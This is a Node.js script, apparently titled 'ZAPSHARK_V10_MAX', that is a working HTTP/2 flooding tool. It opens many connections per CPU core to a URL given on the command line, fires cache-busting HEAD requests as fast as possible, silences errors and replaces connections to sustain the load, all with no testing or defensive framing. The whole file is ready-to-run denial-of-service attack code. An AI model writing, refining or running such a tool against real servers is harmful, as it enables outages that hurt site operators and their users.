const http2 = require('http2');
const os = require('os');

class ZAPSHARK_V10_MAX {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.totalRequests = 0;
        
        // USE ALL CORES MINUS 1
        this.coreCount = Math.max(1, os.cpus().length - 1);
        this.connectionsPerCore = 5;
        this.totalConnections = this.coreCount * this.connectionsPerCore;
        
        // MAX POWER SETTINGS
        this.clients = [];
        this.activeStreams = 0;
        
        // MEMORY LEAK FIX
        this.requestCounter = 0;
        this.lastCleanup = Date.now();
        
        this.attackInterval = null;
    }

    initializeConnections() {
        for (let i = 0; i < this.totalConnections; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 65536,
                    maxDeflateDynamicTableSize: 4294967295,
                    peerMaxConcurrentStreams: 1000
                });
                
                client.setMaxListeners(1000);
                
                client.settings({
                    enablePush: false,
                    initialWindowSize: 16777215,
                    maxConcurrentStreams: 1002
                });
                
                client.on('error', () => {});
                
                this.clients.push({
                    client,
                    requests: 0,
                    created: Date.now()
                });
                
            } catch (err) {}
        }
    }

    // MEMORY LEAK FIX WITHOUT POWER LOSS
    fixMemoryLeak() {
        this.requestCounter++;
        
        if (this.requestCounter % 10000 === 0) {
            const now = Date.now();
            
            // DESTROY OLDEST 10% CONNECTIONS
            const destroyCount = Math.ceil(this.clients.length * 0.1);
            
            for (let i = 0; i < destroyCount; i++) {
                if (this.clients[i]) {
                    try {
                        this.clients[i].client.destroy();
                        
                        // IMMEDIATE REPLACEMENT
                        const newClient = http2.connect(this.targetUrl, {
                            maxSessionMemory: 65536
                        });
                        
                        newClient.setMaxListeners(1000);
                        newClient.on('error', () => {});
                        
                        this.clients[i] = {
                            client: newClient,
                            requests: 0,
                            created: now
                        };
                        
                    } catch (err) {}
                }
            }
            
            this.lastCleanup = now;
            
            // FORCE GARBAGE COLLECTION IF AVAILABLE
            if (global.gc) {
                global.gc();
            }
        }
    }

    sendMaxRequests() {
        if (this.clients.length === 0) return;
        
        const streamsPerTick = Math.min(100, this.clients.length * 10);
        
        for (let i = 0; i < streamsPerTick; i++) {
            const conn = this.clients[Math.floor(Math.random() * this.clients.length)];
            if (!conn) continue;

            try {
                this.activeStreams++;
                
                const req = conn.client.request({
                    ':method': 'HEAD',
                    ':path': '/?' + Date.now()
                });
                
                req.on('response', () => {
                    try { req.destroy(); } catch (e) {}
                });
                
                req.on('error', () => {
                    try { req.destroy(); } catch (e) {}
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    conn.requests++;
                    this.fixMemoryLeak();
                });
                
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.fixMemoryLeak();
            }
        }
    }

    start() {
        this.initializeConnections();
        
        setTimeout(() => {
            this.attackInterval = setInterval(() => {
                for (let batch = 0; batch < 5; batch++) {
                    this.sendMaxRequests();
                }
                process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
            }, 0.1);
            
        }, 2000);
        
        process.on('SIGINT', () => {
            clearInterval(this.attackInterval);
            this.clients.forEach(conn => {
                try { conn.client.destroy(); } catch (e) {}
            });
            process.exit(0);
        });
    }
}

const target = process.argv[2];
if (!target || !target.startsWith('https://')) process.exit(1);

const shark = new ZAPSHARK_V10_MAX(target);
shark.start();
